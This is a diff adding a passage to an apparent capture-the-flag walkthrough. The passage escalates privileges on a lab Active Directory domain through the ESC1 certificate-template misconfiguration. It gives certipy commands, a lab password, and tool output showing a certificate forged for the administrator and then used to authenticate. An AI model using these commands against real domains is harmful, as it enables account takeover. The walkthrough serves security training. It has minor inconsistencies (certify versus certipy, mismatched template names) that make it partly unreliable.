@@ -297,3 +297,27 @@ Info: Upload successful!
 ```
 
 The danger here is that sequel\Domain Users has Enrollment Rights for the certificate (this is scenario 3 in the Certify README). Enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set (ESC1).
+
+##### Exploit it via certify
+```bash
+certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target dc.sequel.htb -template UserAuthentication
+certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target dc.sequel.htb -template UserAuthentication -upn 'administrator@sequel.htb'
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 13
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+Note: If you get the error The NETBIOS connection with the remote host timed out. please re-run the command via `sudo ntpdate -u dc.sequel.htb`. (Now that we have a certificate for the administrator we can use certipy once more to get a Ticket Granting Ticket (TGT) and extract the NT hash for this user. Since this step requires some Kerberos interaction, we
+need to synchronize our clock to the time of the remote machine before we can proceed.)
+
+Then you can transform the generated certificate to `.pfx` format and use it to authenticate using Rubeus or certipy again:
+
+```bash
+certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'sequel.htb' -dc-ip $IP
+```
